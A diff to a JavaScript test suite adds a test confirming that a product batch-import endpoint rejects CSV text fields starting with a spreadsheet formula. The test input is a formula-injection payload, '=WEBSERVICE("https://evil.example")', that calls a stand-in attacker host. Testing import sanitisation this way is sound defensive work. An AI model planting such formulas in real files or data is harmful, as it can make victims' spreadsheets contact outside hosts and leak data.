@@ -252,6 +252,34 @@ describe("POST /products/batch-import", () => {
     expect(products).toHaveLength(0);
   });
 
+  it("rejects spreadsheet formula prefixes in CSV text fields", async () => {
+    const csv = buildCsv([
+      ["name", "gtin", "serialNumber", "category", "description", "materials"],
+      [
+        '=WEBSERVICE("https://evil.example")',
+        VALID_GTIN_13,
+        "FORM001",
+        "Watches",
+        "",
+        "",
+      ],
+    ]);
+
+    const res = await injectCsv(csv, brandAdminCookie);
+    expect(res.statusCode).toBe(200);
+    const data = res.json();
+    expect(data.data.summary).toEqual({
+      totalRows: 1,
+      acceptedRows: 0,
+      rejectedRows: 1,
+    });
+    expect(data.data.errors[0]).toMatchObject({
+      row: 2,
+      field: "name",
+    });
+    expect(data.data.errors[0].message).toContain("spreadsheet formula");
+  });
+
   it("stores imported materials in typed passport metadata", async () => {
     const csv = buildCsv([
       ["name", "gtin", "serialNumber", "category", "description", "materials"],
